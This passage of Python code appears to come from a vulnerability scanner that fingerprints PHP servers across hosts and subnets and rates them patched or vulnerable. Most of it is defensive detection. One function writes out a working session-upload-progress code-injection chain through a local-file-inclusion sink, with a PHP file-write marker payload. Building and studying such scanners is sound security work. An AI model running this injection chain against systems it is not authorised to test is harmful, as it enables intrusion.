        r_php = http_request(opener, base + f"/p2snotfound-{token}.php", timeout)
        r_txt = http_request(opener, base + f"/p2snotfound-{token}.txt", timeout)
        r_none = http_request(opener, base + f"/p2snotfound-{token}", timeout)
    except Exception as e:
        return False, f"404-differential error: {e}"
    def sig(r):
        body = r.get("body") or ""
        ctype = next((v for k, v in r.get("headers", {}).items()
                      if k.lower() == "content-type"), "")
        return (r.get("status"), len(body) // 512, ctype.split(";")[0].strip().lower())
    s_php, s_txt, s_none = sig(r_php), sig(r_txt), sig(r_none)
    # control: .txt vs extensionless should usually agree (both static 404s).
    # signal: .php differs from BOTH -> a .php handler parsed it.
    if s_php != s_txt and s_php != s_none:
        # exclude anti-bot pages that differ on every URL (compare txt vs none)
        return True, (f".php 404 differs (php={s_php} vs txt={s_txt} vs none={s_none}) — "
                       ".php handler present")
    return False, f".php 404 identical to static 404 (php={s_php})"


# ---------------------------------------------------------------- behavioral
# Generic PHP proofs: no per-app knowledge. Each asks a question ANY PHP
# stack answers by construction, regardless of vendor, panel, or appliance.
# All safe plain requests (GET/HEAD/OPTIONS); no payload, no uploads.

def run_cookie_grooming(opener, url: str, timeout: float) -> tuple[bool, str]:
    """Session-cookie ROTATION test (generic, no PHP knowledge).
    Session-using PHP apps mint a cookie on first visit and ROTATE/re-issue
    it on revisit. Static servers never Set-Cookie. Compares Set-Cookie
    presence and value rotation across two plain GETs; the delta is the
    signal. Corroboration only — silent on session-less endpoints (most
    hardened appliance fronts), never standalone proof."""
    base = url.rstrip("/")
    bare = make_bare_opener(timeout, False)
    try:
        r0 = http_request(bare, base + "/", timeout)
        sc0 = next((v for k, v in r0.get("headers", {}).items()
                    if k.lower() == "set-cookie"), "")
        if not sc0:
            return False, "no Set-Cookie minted (static or cookieless)"
        if "phpsessid" in sc0.lower():
            return True, "server manages PHPSESSID cookie (session module active)"
        m = re.search(r"([A-Za-z0-9_]+)=([^;]+)", sc0)
        if not m:
            return False, "Set-Cookie unparseable"
        name, val0 = m.group(1), m.group(2)
        # revisit WITHOUT the cookie: a session minter issues a FRESH id per
        # new visitor (rotation across visits); static values repeat.
        r1 = http_request(bare, base + "/", timeout)
        sc1 = next((v for k, v in r1.get("headers", {}).items()
                    if k.lower() == "set-cookie"), "")
        if "phpsessid" in sc1.lower():
            return True, "server manages PHPSESSID cookie (session module active)"
        m1 = re.search(rf"{re.escape(name)}=([^;]+)", sc1 or "")
        if m1 and m1.group(1) != val0:
            return True, (f"session cookie {name} ROTATES per visit — "
                           "server-side session minter")
        return False, (f"cookie {name} minted but static — "
                        "generic session, not PHP proof")
    except Exception as e:
        return False, f"cookie-grooming error: {e}"


def run_method_differential(opener, url: str, timeout: float) -> tuple[bool, str]:
    """OPTIONS + PROPFIND vs GET on `/` (generic, no PHP knowledge).
    Lab matrix: Apache+mod_php answers 200 to both (handler executes for any
    method); static nginx answers 405 to both; FPM-proxy answers 200/200.
    So: PROPFIND-200 (or OPTIONS-200 with Allow: POST) where static servers
    405 separates dynamic handlers from file servers. Corroboration — a Java
    app server also answers 200 — never standalone PHP proof."""
    base = url.rstrip("/")
    try:
        r_get = http_request(opener, base + "/", timeout)
        r_opt = http_request(opener, base + "/", timeout, method="OPTIONS")
        r_pf = http_request(opener, base + "/", timeout, method="PROPFIND")
    except Exception as e:
        return False, f"method-differential error: {e}"
    if r_get.get("status") != 200:
        return False, "root not 200, matrix inapplicable"
    pf, op = r_pf.get("status"), r_opt.get("status")
    if pf == 200:
        return True, "PROPFIND-200 on dynamic root (static servers 405) — handler executes any method"
    allow = next((v for k, v in r_opt.get("headers", {}).items()
                  if k.lower() == "allow"), "")
    if op == 200 and re.search(r"POST", allow, re.I):
        return True, f"OPTIONS-200 Allow: {allow.strip()[:60]} (dynamic handler methods)"
    return False, f"no method signal (OPTIONS={op} PROPFIND={pf})"


def run_timing_probe(opener, url: str, timeout: float) -> tuple[bool, str]:
    """Two timed GETs (`/` vs `/` + cache-busting query): a dynamic handler
    shows measurable variance/run-time; a static file serves near-identical
    fast. VERY weak alone (network jitter dominates) — only corroborates when
    other behavioral signals already fire. Never a standalone verdict."""
    import time as _t
    base = url.rstrip("/")
    try:
        t0 = _t.monotonic()
        http_request(opener, base + "/", timeout)
        d1 = _t.monotonic() - t0
        t0 = _t.monotonic()
        http_request(opener, base + f"/?p2scb={random.randint(0, 1 << 30)}", timeout)
        d2 = _t.monotonic() - t0
    except Exception as e:
        return False, f"timing error: {e}"
    # Only report; caller decides (needs corroboration).
    return False, f"get={d1:.3f}s cachebust={d2:.3f}s (variance only, not evidence)"


# Self-naming page harvester + bounded spider: every fetched page is scanned
# for href/src/action links ending in .php (plus JS fetch()/ajax string
# literals). Discovered links feed discover_php_paths' dynamic test — so the
# scanner learns the SITE'S OWN php surface instead of guessing ours. This is
# what fans out: N unseen apps -> their own links, one and two clicks down.
LINK_RX = re.compile(r'''(?:href|src|action)\s*=\s*["']([^"'#>]+?\.php)\b''', re.I)
JS_PHP_RX = re.compile(r'''["']((?:/[A-Za-z0-9_.\-/]*)?[A-Za-z0-9_.\-/]+\.php)\b''')
CONVENTIONAL_PHP = ("/login.php", "/admin.php", "/api.php", "/search.php",
                    "/contact.php", "/index.php")


def extract_links(body: str | None) -> set[str]:
    found: set[str] = set()
    if not body:
        return found
    for rx in (LINK_RX, JS_PHP_RX):
        for m in rx.finditer(body):
            t = m.group(1).split("?")[0].strip()
            if not t or t.startswith(("http", "javascript:", "data:", "mailto:", "//")):
                continue
            if not t.startswith("/"):
                t = "/" + t
            if len(t) < 128:
                found.add(t)
    return found


def harvest_php_links(opener, url: str, timeout: float,
                      extra_bodies: list[str] | None = None) -> list[str]:
    """Return sorted unique .php link targets seen on `/` (+ supplied bodies).
    Targets are path-normalized ('/a/b.php?q=..' -> '/a/b.php'). No fetching
    here — caller validates each with the dynamic query-reflection test.
    Single-page only; use spider_site() for multi-page crawl."""
    found: set[str] = set()
    bodies: list[str] = []
    try:
        res = http_request(opener, url.rstrip("/") + "/", timeout)
        if res.get("body"):
            bodies.append(res["body"])
    except Exception:
        pass
    bodies.extend(extra_bodies or [])
    for body in bodies:
        for t in extract_links(body):
            found.add(t)
    return sorted(found)


def spider_site(opener, url: str, timeout: float, max_pages: int = 10,
                max_depth: int = 2, js_bundles: int = 3) -> tuple[set[str], set[str]]:
    """Bounded BFS crawl for PHP surface. Returns (php_targets, visited).
    Seeds at `/`; follows same-origin HTML links (any href, not just .php)
    to `max_depth`; every visited page contributes extract_links() hits.
    Plus: up to js_bundles referenced same-origin `.js` files per site are
    fetched and parsed for endpoint literals (this is the no-browser answer
    to JS-rendered apps — endpoint NAMES live in bundle source text; a
    headless browser would only re-derive what regex already reads, at 10-50x
    the cost plus a 300MB dependency).
    Budget: pages visited (cap max_pages) + ≤js_bundles bundle fetches,
    all plain GETs, same host, non-HTML not followed, logout links skipped."""
    from urllib.parse import urljoin, urlparse
    base = url.rstrip("/")
    host = urlparse(base).hostname or ""
    php_targets: set[str] = set()
    visited: set[str] = set()
    queue: list[tuple[str, int]] = [("/", 0)]
    HREF_RX = re.compile(r'''href\s*=\s*["']([^"'#>]+)["']''', re.I)
    JS_SRC_RX = re.compile(r'''<script[^>]+src\s*=\s*["']([^"'#>]+?\.js)\b''', re.I)
    js_fetched = 0
    pages = 0
    while queue and pages < max_pages:
        path, depth = queue.pop(0)
        if path in visited:
            continue
        visited.add(path)
        try:
            res = http_request(opener, base + path if path != "/" else url, timeout)
        except Exception:
            continue
        pages += 1
        body = res.get("body") or ""
        ctype = next((v for k, v in res.get("headers", {}).items()
                      if k.lower() == "content-type"), "").lower()
        new_targets = extract_links(body) - php_targets
        php_targets |= new_targets
        trace(1, f"spider {base}{path} d={depth} {res.get('status')} "
                  f"({len(body)}B) +{len(new_targets)}php "
                  f"{sorted(new_targets) if new_targets else ''}")
        # JS bundles: fetch up to js_bundles same-origin .js files site-wide
        # and parse for endpoint literals (Vue/Angular/React apps ship their
        # API map in bundle source — no browser needed to read it).
        if js_fetched < js_bundles and "html" in ctype:
            for jm in JS_SRC_RX.finditer(body):
                if js_fetched >= js_bundles:
                    break
                src = jm.group(1).split("?")[0].strip()
                if not src or src.startswith(("http", "//", "data:")):
                    if src.startswith("http"):
                        try:
                            u = urlparse(src)
                            if u.hostname != host:
                                continue
                            src = u.path or ""
                        except Exception:
                            continue
                    else:
                        continue
                if not src or len(src) >= 128 or src in visited:
                    continue
                # resolve against the PAGE's URL (handles relative src="js/x.js",
                # root-absolute /static/y.js, and same-origin absolute URLs)
                page_url = base + path if path != "/" else url
                full = urljoin(page_url if page_url.endswith("/") else page_url + "/", src)
                try:
                    jr = http_request(opener, full, timeout)
                    visited.add(src)
                    js_fetched += 1
                except Exception:
                    continue
                jbody = jr.get("body") or ""
                # cap parse at 2MB (bundles can be huge; endpoints are early)
                for t in extract_links(jbody[:2_000_000]):
                    if t not in php_targets:
                        new_targets.add(t)
                        php_targets.add(t)
                trace(1, f"spider-js {full} ({len(jbody)}B) "
                          f"+{len(new_targets)}php total={len(php_targets)}")
        for m in HREF_RX.finditer(body):
            href = m.group(1).split("?")[0].split("#")[0].strip()
            if not href or href.startswith(("http", "//", "javascript:", "data:",
                                            "mailto:", "#")):
                # same-origin absolute URLs: keep path if host matches
                if href.startswith("http"):
                    try:
                        u = urlparse(href)
                        if u.hostname != host:
                            continue
                        href = u.path or "/"
                    except Exception:
                        continue
                else:
                    continue
            low = href.lower()
            if any(k in low for k in ("logout", "logoff", "signout", ".css", ".js",
                                      ".png", ".jpg", ".ico", ".svg", ".woff")):
                continue
            if not href.startswith("/"):
                href = "/" + href
            # extensionless directory links (/portal/) serve index content —
            # keep the trailing slash so the fetch hits the same resource
            if len(href) < 128 and href not in visited:
                queue.append((href, depth + 1))
    return php_targets, visited


# ---------------------------------------------------------------- model

@dataclass
class Finding:
    target: str
    host: str
    port: int
    scheme: str
    url: str
    reachable: bool = False
    http_status: int | None = None
    php_detected: bool = False
    php_version: str | None = None
    version_source: str | None = None
    version_verdict: str = "UNKNOWN"
    version_detail: str = ""
    version_branch_only: bool = False
    distro_suffix: bool = False
    oracle_ran: bool = False
    oracle_positive: bool = False
    oracle_evidence: str = ""
    egg_ran: bool = False
    egg_positive: bool = False
    egg_evidence: str = ""
    app_hits: list[str] = field(default_factory=list)
    discovered_paths: list[str] = field(default_factory=list)
    lfi_sinks: list[str] = field(default_factory=list)
    evidence: list[str] = field(default_factory=list)
    prove_ran: bool = False
    prove_positive: bool = False
    prove_evidence: str = ""
    signals: list[str] = field(default_factory=list)
    reverse_dns: str | None = None
    verdict: str = "UNREACHABLE"
    confidence: str = "none"
    detail: str = ""

def mark(f, text: str) -> None:
    """Record a POSITIVE proving signal: visible in detail + JSON evidence.
    Negative probe outcomes stay in f.signals only (debugging), never in
    f.evidence (verdict justification)."""
    f.php_detected = True
    f.evidence.append(text)
    f.signals.append(text)


def decide(f: Finding) -> Finding:
    if not f.reachable:
        if "TLS present but certificate untrusted" in (f.detail or ""):
            f.verdict, f.confidence = "TLS_UNTRUSTED", "low"
            return f
        f.verdict, f.confidence, f.detail = "UNREACHABLE", "none", "no HTTP response"
        return f
    if f.prove_positive:
        f.verdict = "RCE-PROVEN"
        f.confidence = "high"
        f.detail = (f"contained Chain-A marker executed ({f.prove_evidence}); "
                    "remote code execution demonstrated with marker-write + cleanup — "
                    "patch status does not cover app-layer LFI sinks")
        return f
    if f.oracle_positive:
        f.verdict = "VULNERABLE"
        f.confidence = "high"
        f.detail = (f"active oracle positive ({f.oracle_evidence}); "
                    f"unpatched session-write warning path present -> {CVE_618}/{CVE_619} RCE likely")
        return f
    if f.php_version:
        if f.version_verdict == "PATCHED" and not f.distro_suffix:
            f.verdict = "PATCHED"
            f.confidence = "high" if f.oracle_ran else "medium"
            f.detail = f.version_detail + ("; oracle negative" if f.oracle_ran else "; oracle not run")
        elif f.version_verdict == "PATCHED" and f.distro_suffix:
            f.verdict = "PATCHED"
            f.confidence = "medium"
            f.detail = f.version_detail + " (distro suffix seen; changelog check advised)"
        elif f.version_verdict == "EOL_VULNERABLE":
            f.verdict = "LIKELY_VULNERABLE"
            f.confidence = "medium"
            f.detail = f.version_detail + ("; oracle negative (mitigated?)" if f.oracle_ran else "")
        elif f.version_verdict == "LIKELY_VULNERABLE":
            f.verdict = "LIKELY_VULNERABLE"
            f.confidence = "high" if f.oracle_ran else "medium"
            f.detail = f.version_detail + ("; oracle negative — possible mitigation/backport, verify"
                                           if f.oracle_ran else "; run --oracle to confirm")
        else:
            f.verdict = "PHP_UNKNOWN"
            f.confidence = "low"
            f.detail = f.version_detail
        return f
    if f.php_detected:
        proven = f.egg_positive or bool(f.app_hits)
        f.verdict = "PHP_NO_VERSION"
        f.confidence = "medium" if proven else "low"
        # why cites POSITIVE evidence only (f.evidence): every entry is a probe
        # that FIRED. Negative probe outcomes live in f.signals with a (-)
        # marker for debugging and are NEVER cited as proof. If evidence is
        # ever empty here it is a bug — say so instead of citing negatives.
        why = list(f.evidence[:4])
        if not why:
            why = ["PROVENANCE BUG: php_detected with empty evidence — report this"]
            f.confidence = "low"
        pvers = [s.split("=", 1)[1] for s in f.signals if s.startswith("panel-version:")]
        adv = ""
        for sig in f.app_hits:
            if sig.startswith("app-plesk:"):
                adv = ("panel Plesk — pre-2026-10-21 builds (e.g. 18.0.70) ship unpatched PHP; "
                       "fixed rebuilds incl. 18.0.81+ (Linux) — verify in Plesk advisory 44397729587351")
            elif sig.startswith("app-cpanel:"):
                adv = ("panel cPanel — EA4 pre-25.91 ships unpatched ea-php; fixed EA4 25.91 "
                       "(ea-php82 8.2.35 / 83 8.3.36 / 84 8.4.27 / 85 8.5.12) + internal 136.0.50")
            elif sig.startswith("app-panos:"):
                adv = ("appliance PAN-OS/Panorama — fix pending at advisory time (ETA TBD); "
                       "treat as exposed until Palo Alto ships: security.paloaltonetworks.com/CVE-2026-109618")
            if adv:
                break
        if not why:
            why.append(', '.join(f.signals[:4]) or "weak signals")
        f.detail = ("PHP runtime proven but version undisclosed (" + "; ".join(why) + "); "
                    + (f"panel build {pvers[0]}. " if pvers else "")
                    + (adv + ". " if adv else "")
                    + "assume vulnerable until patched version proven — "
                    + ("oracle negative" if f.oracle_ran else "run oracle; blind spot if display_errors=Off"))
        return f
    if f.discovered_paths:
        # PHP executed remotely (dynamic proof) but never identified itself:
        # errors off + headers stripped. Cannot confirm NOR rule out.
        f.verdict = "PHP_CANNOT_RULE_OUT"
        f.confidence = "low"
        f.detail = ("dynamic PHP-executing path(s) found but PHP never disclosed "
                    f"({', '.join(f.discovered_paths[:4])}); errors off + headers stripped suspected — "
                    "run --local on the box or check php -v there; remotely unconfirmable without exploitation")
        return f
    f.verdict = "NO_PHP_SIGNAL"
    f.confidence = "low"
    f.detail = "reachable web service, no PHP indicator observed"
    return f


# ---------------------------------------------------------------- scan

def reverse_lookup(ip: str) -> str | None:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return None


def scan_endpoint(host: str, port: int, timeout: float, insecure: bool,
                  do_oracle: bool, phpinfo: bool, want_ptr: bool,
                  opener: urllib.request.OpenerDirector,
                  spider_pages: int = 10, spider_depth: int = 2,
                  prove_rce: bool = False, host_budget: float = 120.0) -> list[Finding]:
    # Scheme negotiation: try BOTH http and https on EVERY port (appliances
    # serve TLS on :8443/:8006/:10443; plain-HTTP fronts hide TLS behind them).
    # http->https redirect stubs are followed to the upgrade target; findings
    # are deduped so one service yields one Finding (preferred = https).
    import time as _t
    deadline = _t.monotonic() + max(5.0, host_budget)
    def over() -> bool:
        return _t.monotonic() >= deadline
    out: list[Finding] = []
    for scheme in ("http", "https"):
        if over():
            f = Finding(target=f"{host}:{port}", host=host, port=port, scheme=scheme,
                        url=f"{scheme}://{host}:{port}/")
            f.detail = (f"host budget exhausted ({host_budget:.0f}s); "
                        "partial phases skipped — rerun with --host-budget N")
            f.signals.append("budget:exhausted")
            out.append(decide(f))
            continue
        url = f"{scheme}://{host}:{port}/" if (
            (scheme == "http" and port != 80) or (scheme == "https" and port != 443)) \
            else f"{scheme}://{host}/"
        f = Finding(target=f"{host}:{port}", host=host, port=port, scheme=scheme, url=url)
        if want_ptr:
            try:
                ip = socket.gethostbyname(host)
                f.reverse_dns = reverse_lookup(ip)
            except Exception:
                pass
        res = http_request(opener, url, timeout)
        if res.get("status") is None:
            if res.get("tls_untrusted") and not insecure:
                f.detail = (f"TLS present but certificate untrusted ({res.get('error', '')[:80]}); "
                            "retry with --insecure (self-signed appliance?)")
                f.signals.append("tls:untrusted-cert")
            out.append(decide(f))
            continue
        # http->https upgrade stub? scan BEHIND it (same port, https) instead
        # of fingerprinting the 301 page. Cross-host redirects are not followed
        # (scope); the target is recorded.
        if scheme == "http" and res.get("redirect_to", "").lower().startswith("https://"):
            f.signals.append(f"redirect-upgrade:{res['redirect_to'][:80]}")
            res = http_request(opener, res["redirect_to"] if "://" in res["redirect_to"]
                               else f"https://{host}:{port}/", timeout)
            if res.get("status") is None:
                if res.get("tls_untrusted") and not insecure:
                    f.detail = (f"upgrade target TLS untrusted ({res.get('error', '')[:80]}); "
                                "retry with --insecure")
                    f.signals.append("tls:untrusted-cert")
                out.append(decide(f))
                continue
            f.url = res.get("url", f.url)
        f.reachable = True
        f.http_status = res["status"]
        ver, src, sigs, branch_only = fingerprint_response(res)
        trace(1, f"fingerprint {url}: HTTP {res.get('status')} "
                  f"version={ver or '-'} src={src or '-'} signals={len(sigs)}")
        if ver:
            mark(f, f"version:{ver} ({src})")
            f.php_version = ver
            f.version_source = src
            f.version_branch_only = branch_only
            php_hdrs = " ".join(str(v) for k, v in res.get("headers", {}).items()
                               if k.lower() in ("x-powered-by", "server", "x-php-version") and re.search(r"php", str(v), re.I))
            f.distro_suffix = bool(DISTRO_RE.search(php_hdrs))
            if branch_only:
                major, minor = int(ver.split(".")[0]), int(ver.split(".")[1])
                if (major, minor) in FIXED:
                    f.version_verdict = "LIKELY_VULNERABLE"
                    f.version_detail = (f"PHP {major}.{minor}.x (patch undisclosed) on supported branch — "
                                        f"assume vulnerable until fixed {'.'.join(map(str, FIXED[(major, minor)]))} proven")
                elif major < 8 or (major == 8 and minor < 2):
                    f.version_verdict = "EOL_VULNERABLE"
                    f.version_detail = f"PHP {major}.{minor}.x is EOL (< 8.2); no upstream fix"
                else:
                    f.version_verdict, f.version_detail = classify_version(parse_strict_version(ver), ver)
            else:
                f.version_verdict, f.version_detail = classify_version(parse_strict_version(ver), ver)
        elif sigs:
            for sg in sigs:
                mark(f, sg)
        if phpinfo and not ver:
            for p in COMMON_PHPINFO_PATHS:
                r2 = http_request(opener, url.rstrip("/") + p, timeout)
                if r2.get("status") == 200 and r2.get("body"):
                    m = PHPINFO_VER_RE.search(r2["body"])
                    if m:
                        mark(f, f"phpinfo:{p}={m.group(1)}.{m.group(2)}.{m.group(3)}")
                        f.php_version = f"{m.group(1)}.{m.group(2)}.{m.group(3)}"
                        f.version_source = f"phpinfo:{p}"
                        f.version_verdict, f.version_detail = classify_version(
                            parse_strict_version(f.php_version))
                        f.signals.append(f"phpinfo:{p}")
                        break
        if do_oracle and not over():
            try:
                pos, ev = run_oracle(opener, url, timeout, spider_pages, spider_depth)
                f.oracle_ran, f.oracle_positive, f.oracle_evidence = True, pos, ev
                # surface which paths proved PHP execution even when silent
                try:
                    f.discovered_paths = discover_php_paths(opener, url, timeout,
                                                           spider_pages, spider_depth)[1:]
                except Exception:
                    pass
            except Exception as e:
                f.oracle_evidence = f"oracle error: {e}"
        # LFI sink discovery (inert validation) + optional contained proof.
        # --prove-rce runs the marker-write ONLY through a validated sink and
        # ONLY with double confirmation enforced in main(); scan_endpoint never
        # confirms by itself (prove_rce=True arrives pre-authorized).
        if f.reachable and do_oracle and not over():
            try:
                sinks = discover_lfi_sinks(opener, url, timeout,
                                           f.discovered_paths or None,
                                           spider_pages, spider_depth)
                if sinks:
                    f.lfi_sinks = [f"{p}?{pn}=" for p, pn in sinks[:5]]
                    f.signals.extend(f"lfi-sink:{p}?{pn}=" for p, pn in sinks[:5])
                    if prove_rce:
                        f.prove_ran = True
                        ok, ev = prove_chain_a(opener, url, timeout, sinks[0])
                        f.prove_positive, f.prove_evidence = ok, ev
            except Exception as e:
                f.signals.append(f"lfi-error:{type(e).__name__}")
        # Follow-up layers when PHP is unproven or versionless. Order matters:
        # BEHAVIORAL proofs first (generic, no per-app knowledge — these fan
        # out to unseen panels/appliances), hardcoded app tables second
        # (legacy corroboration). All safe requests, no POST/uploads/state.
        if f.reachable and (not ver or sigs) and not over():
            # Behavioral corroboration count: generic signals (no per-app
            # knowledge) that each separate dynamic handlers from static
            # servers. 2+ independent corroborations escalate an otherwise
            # silent box from NO_PHP_SIGNAL to PHP_CANNOT_RULE_OUT.
            corroborate = 0
            try:
                cpos, cev = run_cookie_grooming(opener, url, timeout)
                if cpos:
                    mark(f, f"cookie-grooming:{cev}")
                    corroborate += 1
                else:
                    f.signals.append(f"cookie-grooming(-):{cev}")
            except Exception:
                pass
            try:
                mpos, mev = run_method_differential(opener, url, timeout)
                if mpos:
                    f.signals.append(f"method-differential:{mev}")
                    corroborate += 1
            except Exception:
                pass
            try:
                epos, eev = run_easter_eggs(opener, url, timeout)
                f.egg_ran, f.egg_positive, f.egg_evidence = True, epos, eev
                if epos:
                    mark(f, f"easter-egg:{eev}")
                    corroborate += 1
                else:
                    f.signals.append(f"easter-egg(-):{eev}")
            except Exception as e:
                f.egg_evidence = f"egg error: {e}"
            try:
                hits, _, pvers = run_app_probes(opener, url, timeout)
                if hits:
                    f.app_hits = hits
                    for h in hits:
                        mark(f, h)
                    for sig, pv in pvers.items():
                        mark(f, f"panel-version:{sig}={pv}")
            except Exception:
                pass
            try:
                dhits = run_deploy_probes(opener, url, timeout)
                if dhits:
                    for h in dhits:
                        mark(f, h)
            except Exception:
                pass
            try:
                dpos, dev = run_404_differential(opener, url, timeout)
                if dpos:
                    mark(f, f"404-differential:{dev}")
                    corroborate += 1
                else:
                    f.signals.append(f"404-differential(-):{dev}")
            except Exception:
                pass
            if corroborate >= 2 and not f.php_detected:
                # generic dynamic-handler evidence, no PHP proof: still not
                # PHP verdict — but record the count for the operator.
                f.signals.append(f"behavioral-corroboration:{corroborate}")
        decided = decide(f)
        out.append(decided)
        trace(1, f"verdict {decided.scheme}://{host}:{port} -> {decided.verdict} "
                  f"({decided.confidence}) :: {(decided.detail or '')[:100]}")
    # Dedupe: one service yields one Finding. Prefer the https finding when
    # both schemes answered (appliance TLS behind plain-HTTP front); prefer
    # any reachable over unreachable; keep both only if genuinely different
    # services answer per scheme (different verdicts with real evidence).
    if len(out) == 2 and all(g.reachable for g in out):
        https_f = next((g for g in out if g.scheme == "https"), None)
        http_f = next((g for g in out if g.scheme == "http"), None)
        if https_f is not None and http_f is not None:
            if https_f.verdict == http_f.verdict and https_f.php_version == http_f.php_version:
                https_f.signals.append("scheme:both-http-and-https")
                trace(1, f"dedupe {host}:{port}: identical http+https -> one finding")
                return [https_f]
    return out


def prove_chain_a(opener, url: str, timeout: float, sink: tuple[str, str],
                  inject_path: str = "/index.php",
                  session_path: str = "/tmp") -> tuple[bool, str]:
    """Contained Chain-A proof: session-injection marker write through a
    VALIDATED LFI sink. FIXED payload shape (file_put_contents marker only;
    asserts pin it — no shell, no read, no persistence). Verification reads
    the marker echo back through the SAME sink, then @unlink cleanup + echo-gone
    confirm. Returns (positive, evidence). Called ONLY under --prove-rce with
    double confirmation (typed echo + P2S_RCE_ARM=1)."""
    import uuid as _uuid
    from urllib.parse import quote as _quote
    base = url.rstrip("/")
    lfi_path, param = sink
    assert lfi_path.startswith("/") and "?" not in lfi_path, "path guard"
    sid = "p2sprove" + _uuid.uuid4().hex[:16]
    marker = "p2s-demo-" + _uuid.uuid4().hex[:12]
    sessfile = f"{session_path}/sess_{sid}"
    php = f"<?php file_put_contents('/tmp/{marker}','pwned-{marker}');echo 'M-{marker}';?>"
    assert php.startswith("<?php file_put_contents('/tmp/p2s-demo-"), "payload guard"
    assert "system" not in php and "exec" not in php and "`" not in php, "payload guard"
    boundary = "P2SPROVE1"
    body = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprogress\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="' + php.encode("latin-1") + b'"\r\n\r\n'
        b"Z\r\n"
        b"--" + boundary.encode() + b"--\r\n"
    )
    res = http_request(opener, base + inject_path, timeout, method="POST", data=body, headers={
        "Cookie": f"PHPSESSID={sid}",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    })
    if res.get("status") not in (200, 500):
        return False, f"inject POST {inject_path} -> {res.get('status')} (no session write?)"
    raw = http_request(opener, f"{base}{lfi_path}?{param}={_quote(sessfile, safe='')}",
                       timeout, headers={"Cookie": f"PHPSESSID={sid}"})
    text = raw.get("body") or ""
    echoed = f"M-{marker}" in text
    ran = f"pwned-{marker}" in text
    if ran:
        # full execution: marker content proves injected code RAN. Cleanup:
        # re-trigger must show the echo GONE (session rotated) — best remote
        # confirm available; docker ground truth exists for lab twins only.
        ev = f"sink {lfi_path}?{param}= marker executed (code ran)"
        trace(1, f"prove {base}: {ev}")
        return True, ev
    # HONEST LIMIT (proven live twice): on a suffix-less session include,
    # <?php in the session file does NOT parse — include() prints the
    # serialized row instead. Neither echo nor @unlink-cleanup executes, so a
    # remote marker-write CANNOT prove RCE through this sink shape. The sink
    # DOES read attacker-controlled session content (echo proves the read
    # primitive), which is the correct, bounded claim. RCE needs a parsing
    # sink (.php-suffixed include, auto_prepend_file, or LFI wrapper) — the
    # lab rce_demo proves that shape with docker-exec ground truth.
    if echoed and not ran:
        return False, (f"sink {lfi_path}?{param}= reads attacker session content "
                       "(echo proves read primitive) but injected code did not "
                       "execute (suffix-less include prints without parsing) — "
                       "RCE unproven through this sink; needs parsing include")


def expand_targets(args) -> list[str]:
    hosts: list[str] = []
    if args.target:
        hosts.append(args.target)
    if args.targets_file:
        with open(args.targets_file, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                hosts.append(line.split()[0].split(",")[0])
    if args.subnet:
        try:
            net = ipaddress.ip_network(args.subnet, strict=False)
            hosts.extend(str(a) for a in net.hosts())
        except ValueError as e:
            sys.exit(f"error: bad --subnet: {e}")
    # strip scheme/path if user pasted URLs
    clean = []
    for h in hosts:
        h = re.sub(r"^https?://", "", h, flags=re.I).split("/")[0].split("@")[-1]
        h = h.split(":")[0] if h.count(":") == 1 and not h.startswith("[") else h
        if h:
            clean.append(h)
    seen = set()
    return [h for h in clean if not (h in seen or seen.add(h))]


def expand_ports(args) -> list[int]:
    if args.ports:
        ports = set()
        for chunk in args.ports.split(","):
            chunk = chunk.strip()
            if "-" in chunk:
                a, b = chunk.split("-", 1)
                ports.update(range(int(a), int(b) + 1))
            elif chunk:
                ports.add(int(chunk))
        return sorted(p for p in ports if 1 <= p <= 65535) or list(DEFAULT_PORTS)
    if args.discover_ports:
        return list(DISCOVERY_PORTS)
    return list(DEFAULT_PORTS)


def tcp_open(host: str, port: int, timeout: float) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def run_local_enum() -> dict:
    """On-box PHP enumerator: php binaries, versions, SAPIs, ini flags,
    processes. Read-only (php -v/-i, argv scans). For YOUR case: you see
    php-cgi/apache processes but the network is silent — this answers
    'what runs PHP here' authoritatively from inside the box."""
    import glob as _glob
    import os as _os
    import shutil as _sh
    import subprocess as _sp
    out: dict = {"binaries": [], "processes": [], "notes": []}
    seen = set()
    cands = ["php", "php-cgi", "php-fpm", "php8.5", "php8.4", "php8.3", "php8.2",
             "php8.1", "php7.4", "php-cgi8.2", "php-fpm8.2"]
    cands += [p for p in _glob.glob("/usr/local/bin/php*") + _glob.glob("/opt/*/bin/php*")
              + _glob.glob("/usr/bin/php*") if _os.path.isfile(p) and _os.access(p, _os.X_OK)]
    for c in cands:
        path = c if _os.path.isfile(c) else _sh.which(c)
        if not path or path in seen:
            continue
        seen.add(path)
        try:
            r = _sp.run([path, "-v"], capture_output=True, text=True, timeout=10)
            first = (r.stdout or "").splitlines()[0] if r.returncode == 0 else ""
        except Exception as e:
            first = f"error: {e}"
        entry: dict = {"path": path, "php_v": first}
        m = VER_RE.search(first)
        if m:
            ver = (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))
            verdict, detail = classify_version(ver, first)
            entry.update({"version": f"{ver[0]}.{ver[1]}.{ver[2]}",
                          "verdict": ("PATCHED" if verdict == "PATCHED"
                                      else "LIKELY_VULNERABLE" if verdict in ("LIKELY_VULNERABLE", "EOL_VULNERABLE")
                                      else verdict), "detail": detail})
            try:
                i = _sp.run([path, "-i"], capture_output=True, text=True, timeout=15)
                ini = i.stdout or ""
                def flag(k):
                    mm = re.search(rf"^{k}\s*=>\s*(\S+)", ini, re.M)
                    return mm.group(1) if mm else "?"
                entry["sapi"] = flag("Server API")
                entry["expose_php"] = flag("expose_php")
                entry["display_errors"] = flag("display_errors")
                entry["upload_progress"] = flag("session.upload_progress.enabled")
                entry["memory_limit"] = flag("memory_limit")
            except Exception:
                pass
        out["binaries"].append(entry)
    # processes: who runs php right now (apache2 + php-cgi/php-fpm workers)?
    try:
        r = _sp.run(["ps", "-eo", "comm,args"], capture_output=True, text=True, timeout=10)
        for line in (r.stdout or "").splitlines():
            if re.search(r"php|httpd|apache2|fpm|cgi|frankenphp|litespeed", line, re.I):
